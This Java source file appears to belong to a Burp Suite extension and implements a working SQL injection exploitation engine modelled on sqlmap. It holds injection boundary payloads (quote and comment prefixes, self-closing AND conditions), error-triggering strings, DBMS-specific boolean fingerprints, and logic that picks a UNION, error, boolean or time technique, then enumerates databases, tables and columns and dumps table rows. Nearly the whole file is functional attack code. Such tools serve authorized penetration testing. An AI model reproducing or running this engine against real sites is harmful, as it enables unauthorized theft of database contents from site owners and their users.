package com.omnistrike.modules.exploit.omnimap;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.modules.exploit.omnimap.dbms.DbmsDetector;
import com.omnistrike.modules.exploit.omnimap.dbms.DbmsDialect;
import com.omnistrike.modules.exploit.omnimap.tamper.TamperEngine;
import com.omnistrike.modules.exploit.omnimap.technique.*;

import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.ThreadLocalRandom;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * OmniMap Engine — high-speed SQL injection exploitation orchestrator.
 * A sqlmap variant built into OmniStrike with parallel extraction,
 * adaptive bisection, and predictive optimization.
 *
 * Pipeline:
 * 1. DBMS detection (auto-detect from errors or user-specified)
 * 2. Technique selection (test which work, rank by speed: UNION > Error > Boolean > Time)
 * 3. Data extraction (databases/tables/columns/dump based on action)
 * 4. Real-time progress callbacks to UI panel
 */
public class OmniMapEngine {

    private final MontoyaApi api;
    private volatile boolean cancelled = false;
    private ExecutorService enginePool;

    // Active extractors (for cancellation)
    private volatile UnionExtractor unionExtractor;
    private volatile ErrorExtractor errorExtractor;
    private volatile BlindExtractor blindExtractor;
    private volatile TimeExtractor timeExtractor;

    public OmniMapEngine(MontoyaApi api) {
        this.api = api;
    }

    /**
     * Main exploitation entry point. Runs asynchronously on a background thread.
     */
    public void exploit(HttpRequestResponse request, OmniMapConfig config, OmniMapCallback callback) {
        cancelled = false;
        enginePool = Executors.newFixedThreadPool(config.getThreads());

        enginePool.submit(() -> {
            OmniMapResult result = new OmniMapResult();
            result.setStartTime(System.currentTimeMillis());

            try {
                callback.onProgress("OmniMap starting exploitation...", 0);

                // Step 1: Boundary Detection FIRST (DBMS-agnostic)
                // We need the boundary before DBMS detection so we can use boolean-based
                // fingerprinting when error-based detection fails (e.g., blind SQLi labs)
                if (config.getPrefix().isEmpty() && config.getSuffix().isEmpty()) {
                    detectBoundary(request, config, callback, result);
                }

                // Step 2: DBMS Detection (can now use boolean-based with the working boundary)
                DbmsDialect dialect = detectDbms(request, config, callback, result);
                if (dialect == null || cancelled) {
                    callback.onError("Failed to detect DBMS. Try specifying it manually.");
                    return;
                }

                result.setDbms(dialect.getName());
                callback.onDbmsDetected(dialect.getName());

                // Step 2: Technique Selection — test which techniques work
                String bestTechnique = selectTechnique(request, config, dialect, callback, result);
                if (bestTechnique == null || cancelled) {
                    callback.onError("No working exploitation technique found. " +
                            "The parameter may not be injectable or requires different settings.");
                    return;
                }

                result.setTechnique(bestTechnique);
                callback.onProgress("Using technique: " + bestTechnique, 20);

                // Step 3: Data Extraction based on action
                switch (config.getAction()) {
                    case "databases" -> extractDatabases(config, dialect, callback, result, request);
                    case "tables" -> extractTables(config, dialect, callback, result, request);
                    case "columns" -> extractColumns(config, dialect, callback, result, request);
                    case "dump" -> dumpData(config, dialect, callback, result, request);
                    default -> extractDatabases(config, dialect, callback, result, request);
                }

                // Complete
                result.setElapsedMs(System.currentTimeMillis() - result.getStartTime());
                callback.onProgress("Extraction complete! " + result.getRequestCount() + " requests in " +
                        (result.getElapsedMs() / 1000) + "s", 100);
                callback.onComplete(result);

            } catch (Exception e) {
                callback.onError("Engine error: " + e.getMessage());
            }
        });
    }

    /**
     * Stop all running extraction.
     */
    public void stop() {
        cancelled = true;
        if (unionExtractor != null) unionExtractor.cancel();
        if (errorExtractor != null) errorExtractor.cancel();
        if (blindExtractor != null) blindExtractor.cancel();
        if (timeExtractor != null) timeExtractor.cancel();
        if (enginePool != null) {
            enginePool.shutdownNow();
        }
    }

    // ==================== Boundary Detection ====================

    /**
     * Auto-detect the correct injection boundary (prefix/suffix).
     * Mirrors sqlmap's boundary detection: tries common prefix/suffix combinations
     * based on level and picks the one where AND 1=1 and AND 1=2 produce different responses.
     *
     * Two types of boundaries:
     * 1. COMMENT-BASED: suffix is a SQL comment (-- -, #) that kills the trailing quote
     *    Example: ' AND 1=1 -- -   → WHERE id='xyz' AND 1=1 -- -'
     * 2. SELF-CLOSING: suffix re-closes the original quote so the query stays valid
     *    Example: ' AND '1'='1     → WHERE id='xyz' AND '1'='1'
     *    Critical for cookie-based injection where comments may not work!
     *
     * After finding a working boundary, auto-detects a distinguishing string
     * (like sqlmap's --string) by diffing the true/false response bodies.
     */
    private void detectBoundary(HttpRequestResponse request, OmniMapConfig config,
                                 OmniMapCallback callback, OmniMapResult result) {
        callback.onProgress("Auto-detecting injection boundary...", 10);

        // Boundaries: {prefix, suffix}
        // Ordered by commonality — level controls how many we try
        // Includes BOTH comment-based AND self-closing patterns
        // Self-closing suffixes use random integers like sqlmap
        int ri = ThreadLocalRandom.current().nextInt(1000, 10000);
        String[][] boundaries = {
                // ===== Level 1: most common =====
                {"'", "-- -"},                                  // Single quote + universal comment
                {"'", "#"},                                     // Single quote + MySQL comment
                {"'", "AND '" + ri + "'='" + ri},               // Self-closing single quote (cookie injection!)
                {"\"", "-- -"},                                 // Double quote + comment
                {"", "-- -"},                                   // Numeric (no quote needed)
                {"", "AND " + ri + "=" + ri},                   // Numeric self-closing

                // ===== Level 2 =====
                {"')", "-- -"},                                 // Close paren + comment
                {"')", "#"},
                {"\")", "-- -"},
                {"", "#"},
                {"\"", "AND \"" + ri + "\"=\"" + ri},           // Self-closing double quote
                {"')", "AND ('" + ri + "')=('" + ri},           // Self-closing with parens

                // ===== Level 3 =====
                {"'))", "-- -"},
                {"\"))", "-- -"},
                {"' ", "-- -"},                                 // Space after quote
                {"') ", "-- -"},
                {"' OR '" + ri + "'='" + ri + "' -- -", ""},    // OR-based (rare)

                // ===== Level 4-5: exotic =====
                {"')))", "-- -"},
                {"%27", "-- -"},                                // URL-encoded quote
                {"') ", "-- -"},
                {"'/*", "*/-- -"},                              // Inline comment
        };

        int maxTries = switch (config.getLevel()) {
            case 1 -> 6;    // Includes self-closing in level 1
            case 2 -> 12;
            case 3 -> 17;
            default -> boundaries.length;
        };

        ResponseAnalyzer analyzer = new ResponseAnalyzer();

        // sqlmap uses random integers for AND conditions, not static 1=1/1=2
        int randInt = ThreadLocalRandom.current().nextInt(1000, 10000);

        for (int i = 0; i < Math.min(maxTries, boundaries.length) && !cancelled; i++) {
            String prefix = boundaries[i][0];
            String suffix = boundaries[i][1];

            try {
                // Test true condition: prefix + AND randInt=randInt + suffix
                String truePayload = prefix + " AND " + randInt + "=" + randInt + " " + suffix;
                truePayload = TamperEngine.apply(truePayload, config.getTampers());
                HttpRequest trueReq = PayloadInjector.inject(request.request(),
                        config.getParameterName(), config.getParameterType(), truePayload);
                long s1 = System.currentTimeMillis();
                HttpRequestResponse trueRr = api.http().sendRequest(trueReq);
                long e1 = System.currentTimeMillis() - s1;
                result.incrementRequestCount();
                callback.onRequestSent(trueRr, prefix + " AND " + randInt + "=" + randInt + " " + suffix, "BOUNDARY", e1);

                // Test false condition: prefix + AND randInt=randInt+1 + suffix
                String falsePayload = prefix + " AND " + randInt + "=" + (randInt + 1) + " " + suffix;
                falsePayload = TamperEngine.apply(falsePayload, config.getTampers());
                HttpRequest falseReq = PayloadInjector.inject(request.request(),
                        config.getParameterName(), config.getParameterType(), falsePayload);
                long s2 = System.currentTimeMillis();
                HttpRequestResponse falseRr = api.http().sendRequest(falseReq);
                long e2 = System.currentTimeMillis() - s2;
                result.incrementRequestCount();
                callback.onRequestSent(falseRr, prefix + " AND " + randInt + "=" + (randInt + 1) + " " + suffix, "BOUNDARY", e2);

                if (trueRr.response() != null && falseRr.response() != null) {
                    String trueBody = trueRr.response().bodyToString();
                    String falseBody = falseRr.response().bodyToString();

                    // Signal 1: Status code difference (strong)
                    int trueStatus = trueRr.response().statusCode();
                    int falseStatus = falseRr.response().statusCode();
                    boolean statusDiffers = trueStatus != falseStatus;

                    // Signal 2: Content-length difference
                    int lenDiff = Math.abs(trueBody.length() - falseBody.length());

                    // Signal 3: Body similarity ratio
                    double similarity = analyzer.similarity(trueBody, falseBody);

                    // Signal 4: String-level diff — catches subtle diffs like "Welcome back"
                    // in large pages where overall similarity is 0.99+ but a specific
                    // text exists in true response and not in false response
                    String autoTrueString = analyzer.autoDetectTrueString(trueBody, falseBody);
                    boolean stringDiffers = autoTrueString != null && !autoTrueString.isEmpty();

                    // Boundary works if ANY signal shows a difference
                    if (similarity < 0.98 || statusDiffers || stringDiffers || lenDiff > 20) {
                        config.setPrefix(prefix);
                        config.setSuffix(suffix);
                        callback.onProgress("Boundary detected: prefix=\"" + prefix +
                                "\" suffix=\"" + suffix + "\" (sim=" +
                                String.format("%.3f", similarity) +
                                ", status=" + trueStatus + "/" + falseStatus +
                                ", lenDiff=" + lenDiff +
                                (stringDiffers ? ", marker=\"" + autoTrueString + "\"" : "") + ")", 15);

                        // Set auto-detected string for boolean comparison
                        if (stringDiffers && config.getTrueString().isEmpty()) {
                            config.setTrueString(autoTrueString);
                            callback.onProgress("Auto-detected true marker: \"" + autoTrueString + "\"", 16);
                        }

                        return;
                    }
                }
            } catch (Exception e) {
                // Continue with next boundary
            }
        }

        // Fallback: use single quote + universal comment
        config.setPrefix("'");
        config.setSuffix("-- -");
        callback.onProgress("Boundary: defaulting to ' ... -- -", 15);
    }

    // ==================== DBMS Detection ====================

    private DbmsDialect detectDbms(HttpRequestResponse request, OmniMapConfig config,
                                    OmniMapCallback callback, OmniMapResult result) {
        // User-specified DBMS
        if (config.getDbms() != null && !config.getDbms().isEmpty() && !"Auto-detect".equals(config.getDbms())) {
            callback.onProgress("Using specified DBMS: " + config.getDbms(), 5);
            return DbmsDetector.getDialect(config.getDbms());
        }

        callback.onProgress("Auto-detecting DBMS...", 3);

        // Strategy 1: Error-based detection — inject error-triggering payloads
        // and match DBMS-specific error patterns in the response
        String[] errorPayloads = {"'", "\"", "1'", "1\"", "' OR '1'='1", "1 AND 1=CONVERT(int,@@version)"};
        for (String errPayload : errorPayloads) {
            if (cancelled) return null;

            try {
                String payload = TamperEngine.apply(errPayload, config.getTampers());
                HttpRequest req = PayloadInjector.inject(request.request(),
                        config.getParameterName(), config.getParameterType(),
                        config.getPrefix() + payload + (config.getSuffix().isEmpty() ? "" : config.getSuffix()));
                long start = System.currentTimeMillis();
                HttpRequestResponse rr = api.http().sendRequest(req);
                long elapsed = System.currentTimeMillis() - start;
                result.incrementRequestCount();
                callback.onRequestSent(rr, errPayload, "DETECT", elapsed);

                if (rr.response() != null) {
                    String body = rr.response().bodyToString();
                    DbmsDialect detected = DbmsDetector.detectFromResponse(body);
                    if (detected != null) {
                        callback.onProgress("DBMS detected: " + detected.getName() + " (error fingerprint)", 8);
                        return detected;
                    }
                }
            } catch (Exception e) {
                // Continue with next payload
            }
        }

        // Strategy 2: Boolean-based DBMS fingerprinting
        // Uses the boundary detected in Step 1 to test DBMS-specific functions.
        // Each function is unique to its DBMS — if it evaluates successfully (true page),
        // we've identified the backend. This is critical for blind SQLi where no error
        // messages are returned.
        if (!config.getPrefix().isEmpty() || !config.getSuffix().isEmpty()) {
            callback.onProgress("DBMS: Boolean-based fingerprinting...", 5);

            // First, get a true baseline using the detected boundary
            ResponseAnalyzer analyzer = new ResponseAnalyzer();
            if (!config.getTrueString().isEmpty()) analyzer.setTrueString(config.getTrueString());
            if (!config.getFalseString().isEmpty()) analyzer.setFalseString(config.getFalseString());

            String trueBaseline = null;
            String falseBaseline = null;

            // Random integers for true/false conditions (like sqlmap)
            int dbmsRand = ThreadLocalRandom.current().nextInt(1000, 10000);

            try {
                // Baseline true: prefix + AND randInt=randInt + suffix
                String trueP = config.getPrefix() + " AND " + dbmsRand + "=" + dbmsRand + " " + config.getSuffix();
                trueP = TamperEngine.apply(trueP, config.getTampers());
                HttpRequest trueReq = PayloadInjector.inject(request.request(),
                        config.getParameterName(), config.getParameterType(), trueP);
                long s1 = System.currentTimeMillis();
                HttpRequestResponse trueRr = api.http().sendRequest(trueReq);
                long e1 = System.currentTimeMillis() - s1;
                result.incrementRequestCount();
                callback.onRequestSent(trueRr, "AND " + dbmsRand + "=" + dbmsRand + " (DBMS baseline)", "DETECT", e1);
                if (trueRr.response() != null) {
                    trueBaseline = trueRr.response().bodyToString();
                    analyzer.setTrueStatusCode(trueRr.response().statusCode());
                }

                // Baseline false: prefix + AND randInt=randInt+1 + suffix
                String falseP = config.getPrefix() + " AND " + dbmsRand + "=" + (dbmsRand + 1) + " " + config.getSuffix();
                falseP = TamperEngine.apply(falseP, config.getTampers());
                HttpRequest falseReq = PayloadInjector.inject(request.request(),
                        config.getParameterName(), config.getParameterType(), falseP);
                long s2 = System.currentTimeMillis();
                HttpRequestResponse falseRr = api.http().sendRequest(falseReq);
                long e2 = System.currentTimeMillis() - s2;
                result.incrementRequestCount();
                callback.onRequestSent(falseRr, "AND " + dbmsRand + "=" + (dbmsRand + 1) + " (DBMS baseline)", "DETECT", e2);
                if (falseRr.response() != null) {
                    falseBaseline = falseRr.response().bodyToString();
                    analyzer.setFalseStatusCode(falseRr.response().statusCode());
                }
            } catch (Exception e) {
                // Continue without baselines
            }

            if (trueBaseline != null && falseBaseline != null) {
                // DBMS-specific boolean fingerprints: unique functions that only exist on one DBMS
                // If the function exists → query succeeds → true page
                // If the function doesn't exist → SQL error → false/error page
                String[][] fingerprints = {
                        {"PostgreSQL", "PG_BACKEND_PID()>0"},       // PG_BACKEND_PID() is PostgreSQL-only
                        {"MySQL", "CONNECTION_ID()>0"},             // CONNECTION_ID() is MySQL-only
                        {"MSSQL", "@@SPID>0"},                      // @@SPID is MSSQL-only
                        {"Oracle", "BITAND(1,1)=1"},                // BITAND() is Oracle-only
                        {"SQLite", "SQLITE_VERSION() IS NOT NULL"}, // SQLITE_VERSION() is SQLite-only
                };

                for (String[] fp : fingerprints) {
                    if (cancelled) return null;
                    String dbmsName = fp[0];
                    String condition = fp[1];

                    try {
                        String testPayload = config.getPrefix() + " AND " + condition + " " + config.getSuffix();
                        testPayload = TamperEngine.apply(testPayload, config.getTampers());
                        HttpRequest testReq = PayloadInjector.inject(request.request(),
                                config.getParameterName(), config.getParameterType(), testPayload);
                        long s3 = System.currentTimeMillis();
                        HttpRequestResponse testRr = api.http().sendRequest(testReq);
                        long e3 = System.currentTimeMillis() - s3;
                        result.incrementRequestCount();
                        callback.onRequestSent(testRr, dbmsName + ": " + condition, "DETECT", e3);

                        if (testRr.response() != null) {
                            String testBody = testRr.response().bodyToString();
                            int testStatus = testRr.response().statusCode();

                            // Check if this response matches the "true" baseline
                            boolean isTrue = analyzer.isTruePage(trueBaseline, falseBaseline, testBody, testStatus);
                            if (isTrue) {
                                callback.onProgress("DBMS detected: " + dbmsName + " (boolean fingerprint: " + condition + ")", 8);
                                return DbmsDetector.getDialect(dbmsName);
                            }
                        }
                    } catch (Exception e) {
                        // Continue with next DBMS
                    }
                }
            }
        }

        // Default to MySQL if nothing detected
        callback.onProgress("DBMS: Defaulting to MySQL (no fingerprint matched)", 8);
        return DbmsDetector.getDialect("MySQL");
    }

    // ==================== Technique Selection ====================

    private String selectTechnique(HttpRequestResponse request, OmniMapConfig config,
                                    DbmsDialect dialect, OmniMapCallback callback,
                                    OmniMapResult result) {
        Set<Technique> enabled = config.getTechniques();

        // Test techniques in speed order: UNION > Error > Boolean > Time
        // Only keep extractors that successfully detect — null out failures
        // so extractValue/extractValues/dumpData don't try dead extractors.
        if (enabled.contains(Technique.UNION)) {
            callback.onProgress("Testing UNION-based injection...", 12);
            UnionExtractor ue = new UnionExtractor(api, config, dialect, callback, result, request);
            if (ue.detect()) { unionExtractor = ue; return "UNION"; }
        }

        if (cancelled) return null;

        if (enabled.contains(Technique.ERROR)) {
            callback.onProgress("Testing Error-based injection...", 14);
            ErrorExtractor ee = new ErrorExtractor(api, config, dialect, callback, result, request);
            if (ee.detect()) { errorExtractor = ee; return "ERROR"; }
        }

        if (cancelled) return null;

        if (enabled.contains(Technique.BOOLEAN)) {
            callback.onProgress("Testing Boolean blind injection...", 16);
            BlindExtractor be = new BlindExtractor(api, config, dialect, callback, result, request);
            if (be.detect()) { blindExtractor = be; return "BOOLEAN"; }
        }

        if (cancelled) return null;

        if (enabled.contains(Technique.TIME)) {
            callback.onProgress("Testing Time-based blind injection...", 18);
            TimeExtractor te = new TimeExtractor(api, config, dialect, callback, result, request);
            if (te.detect()) { timeExtractor = te; return "TIME"; }
        }

        return null;
    }

    // ==================== Data Extraction ====================
    // All actions cascade like sqlmap:
    //   "databases" → list databases
    //   "tables"    → resolve DB → list tables
    //   "columns"   → resolve DB → resolve tables → list columns for each
    //   "dump"      → resolve DB → resolve tables → resolve columns → dump rows for each

    /**
     * Resolve the target database. Uses config value if set, otherwise extracts current DB.
     */
    private String resolveDatabase(OmniMapConfig config, DbmsDialect dialect,
                                    OmniMapCallback callback, OmniMapResult result,
                                    HttpRequestResponse request) {
        String db = config.getTargetDatabase();
        if (db != null && !db.isEmpty()) return db;

        callback.onProgress("Detecting current database...", 22);
        db = extractValue(dialect.currentDatabase(), config, dialect, callback, result, request);
        if (db != null && !db.isEmpty()) {
            callback.onProgress("Current database: " + db, 25);
        }
        return db;
    }

    /**
     * Resolve target tables. Uses config value if set, otherwise enumerates all tables.
     */
    private List<String> resolveTables(String targetDb, OmniMapConfig config, DbmsDialect dialect,
                                        OmniMapCallback callback, OmniMapResult result,
                                        HttpRequestResponse request) {
        String configTable = config.getTargetTable();
        if (configTable != null && !configTable.isEmpty()) {
            return List.of(configTable);
        }

        callback.onProgress("Enumerating tables in " + targetDb + "...", 28);
        List<String> tables = extractValues(dialect.listTables(targetDb), config, dialect, callback, result, request);
        if (tables != null && !tables.isEmpty()) {
            result.setTables(targetDb, tables);
            callback.onTablesFound(targetDb, tables);
            callback.onProgress("Found " + tables.size() + " table(s) in " + targetDb, 30);
        }
        return tables != null ? tables : new ArrayList<>();
    }

    private void extractDatabases(OmniMapConfig config, DbmsDialect dialect,
                                   OmniMapCallback callback, OmniMapResult result,
                                   HttpRequestResponse request) {
        callback.onProgress("Extracting databases...", 25);

        String currentDb = extractValue(dialect.currentDatabase(), config, dialect, callback, result, request);
        if (currentDb != null && !currentDb.isEmpty()) {
            callback.onProgress("Current database: " + currentDb, 30);
        }

        List<String> databases = extractValues(dialect.listDatabases(), config, dialect, callback, result, request);
        if (databases != null && !databases.isEmpty()) {
            if (currentDb != null && !databases.contains(currentDb)) {
                databases.add(0, currentDb);
            }
            result.setDatabases(databases);
            callback.onDatabasesFound(databases);
            callback.onProgress("Found " + databases.size() + " database(s)", 90);
        } else if (currentDb != null) {
            result.addDatabase(currentDb);
            callback.onDatabasesFound(List.of(currentDb));
        }
    }

    private void extractTables(OmniMapConfig config, DbmsDialect dialect,
                                OmniMapCallback callback, OmniMapResult result,
                                HttpRequestResponse request) {
        String targetDb = resolveDatabase(config, dialect, callback, result, request);
        if (targetDb == null || targetDb.isEmpty()) {
            callback.onError("Could not determine target database");
            return;
        }

        callback.onProgress("Extracting tables from " + targetDb + "...", 25);
        List<String> tables = extractValues(dialect.listTables(targetDb), config, dialect, callback, result, request);
        if (tables != null && !tables.isEmpty()) {
            result.setTables(targetDb, tables);
            callback.onTablesFound(targetDb, tables);
            callback.onProgress("Found " + tables.size() + " table(s) in " + targetDb, 90);
        }
    }

    private void extractColumns(OmniMapConfig config, DbmsDialect dialect,
                                 OmniMapCallback callback, OmniMapResult result,
                                 HttpRequestResponse request) {
        String targetDb = resolveDatabase(config, dialect, callback, result, request);
        if (targetDb == null || targetDb.isEmpty()) {
            callback.onError("Could not determine target database");
            return;
        }

        // Cascade: if no table specified, enumerate all tables and list columns for each
        List<String> tables = resolveTables(targetDb, config, dialect, callback, result, request);
        if (tables.isEmpty()) {
            callback.onError("No tables found in " + targetDb);
            return;
        }

        for (int t = 0; t < tables.size() && !cancelled; t++) {
            String table = tables.get(t);
            callback.onProgress("Extracting columns from " + targetDb + "." + table +
                    " (" + (t + 1) + "/" + tables.size() + ")...", 30 + (t * 60 / tables.size()));
            List<String> columns = extractValues(dialect.listColumns(targetDb, table),
                    config, dialect, callback, result, request);
            if (columns != null && !columns.isEmpty()) {
                result.setColumns(targetDb + "." + table, columns);
                callback.onColumnsFound(targetDb, table, columns);
            }
        }
        callback.onProgress("Column enumeration complete", 90);
    }

    /**
     * Dump data — cascades like sqlmap's --dump:
     * 1. Resolve database (current DB if not specified)
     * 2. Resolve tables (enumerate all if not specified)
     * 3. For each table: resolve columns, count rows, dump all rows
     */
    private void dumpData(OmniMapConfig config, DbmsDialect dialect,
                           OmniMapCallback callback, OmniMapResult result,
                           HttpRequestResponse request) {
        String targetDb = resolveDatabase(config, dialect, callback, result, request);
        if (targetDb == null || targetDb.isEmpty()) {
            callback.onError("Could not determine target database");
            return;
        }

        List<String> tables = resolveTables(targetDb, config, dialect, callback, result, request);
        if (tables.isEmpty()) {
            callback.onError("No tables found in " + targetDb);
            return;
        }

        // Dump each table
        for (int t = 0; t < tables.size() && !cancelled; t++) {
            String table = tables.get(t);
            callback.onProgress("Dumping table " + (t + 1) + "/" + tables.size() + ": " +
                    targetDb + "." + table + "...", 25 + (t * 65 / tables.size()));

            dumpSingleTable(targetDb, table, config, dialect, callback, result, request);
        }
    }

    /**
     * Dump a single table: resolve columns → count rows → extract all rows.
     */
    private void dumpSingleTable(String targetDb, String table, OmniMapConfig config,
                                  DbmsDialect dialect, OmniMapCallback callback,
                                  OmniMapResult result, HttpRequestResponse request) {
        // Get columns
        List<String> columns = config.getTargetColumns();
        if (columns == null || columns.isEmpty()) {
            columns = extractValues(dialect.listColumns(targetDb, table),
                    config, dialect, callback, result, request);
            if (columns == null || columns.isEmpty()) {
                callback.onProgress("Skipping " + table + " — could not determine columns", 0);
                return;
            }
            result.setColumns(targetDb + "." + table, columns);
            callback.onColumnsFound(targetDb, table, columns);
        }

        // Get row count
        String countStr = extractValue(dialect.countRows(targetDb, table),
                config, dialect, callback, result, request);
        int rowCount = 0;
        try { rowCount = Integer.parseInt(countStr != null ? countStr.trim() : "0"); }
        catch (NumberFormatException ignored) {}

        // If count unknown, dump until empty (cap at 500 for safety)
        int maxRows = rowCount > 0 ? rowCount : 500;
        int limit = config.getDumpLimit() > 0 ? Math.min(config.getDumpLimit(), maxRows) : maxRows;

        if (rowCount > 0) {
            callback.onProgress("Dumping " + limit + " row(s) from " + table + "...", 0);
        } else {
            callback.onProgress("Row count unknown — dumping " + table + "...", 0);
        }

        String dbTable = targetDb + "." + table;

        for (int offset = 0; offset < limit && !cancelled; offset++) {
            String query = dialect.dumpData(targetDb, table, columns, offset, 1);
            String rowData = extractValue(query, config, dialect, callback, result, request);
            if (rowData == null || rowData.isEmpty()) break;

            Map<String, String> row = parseRow(rowData, columns);
            result.addRow(dbTable, row);
            callback.onRowExtracted(targetDb, table, row);

            callback.onProgress("Dumped " + (offset + 1) + "/" +
                    (rowCount > 0 ? String.valueOf(limit) : "?") + " rows from " + table, 0);
        }
    }

    // ==================== Extraction Helpers ====================

    /**
     * Extract a single value using the best available technique.
     */
    private String extractValue(String query, OmniMapConfig config, DbmsDialect dialect,
                                 OmniMapCallback callback, OmniMapResult result,
                                 HttpRequestResponse request) {
        if (cancelled) return null;

        // Try techniques in order of speed
        if (unionExtractor != null) {
            String val = unionExtractor.extractSingle(query);
            if (val != null) return val;
        }
        if (errorExtractor != null) {
            String val = errorExtractor.extractSingle(query);
            if (val != null) return val;
        }
        if (blindExtractor != null) {
            // Try predictive first for common names
            String predicted = blindExtractor.tryPredictive(query);
            if (predicted != null) return predicted;
            String val = blindExtractor.extractSingle(query);
            if (val != null) return val;
        }
        if (timeExtractor != null) {
            return timeExtractor.extractSingle(query);
        }

        return null;
    }

    /**
     * Extract a list of values using the best available technique.
     */
    private List<String> extractValues(String query, OmniMapConfig config, DbmsDialect dialect,
                                        OmniMapCallback callback, OmniMapResult result,
                                        HttpRequestResponse request) {
        if (cancelled) return new ArrayList<>();

        if (unionExtractor != null) {
            List<String> vals = unionExtractor.extractList(query);
            if (!vals.isEmpty()) return vals;
        }
        if (errorExtractor != null) {
            List<String> vals = errorExtractor.extractList(query);
            if (!vals.isEmpty()) return vals;
        }
        if (blindExtractor != null) {
            List<String> vals = blindExtractor.extractList(query);
            if (!vals.isEmpty()) return vals;
        }
        if (timeExtractor != null) {
            return timeExtractor.extractList(query);
        }

        return new ArrayList<>();
    }

    /**
     * Parse a pipe-delimited row string into a column→value map.
     */
    private Map<String, String> parseRow(String rowData, List<String> columns) {
        Map<String, String> row = new LinkedHashMap<>();
        String[] values = rowData.split("\\|", -1);
        for (int i = 0; i < columns.size(); i++) {
            String value = i < values.length ? values[i].trim() : "";
            row.put(columns.get(i), value);
        }
        return row;
    }
}
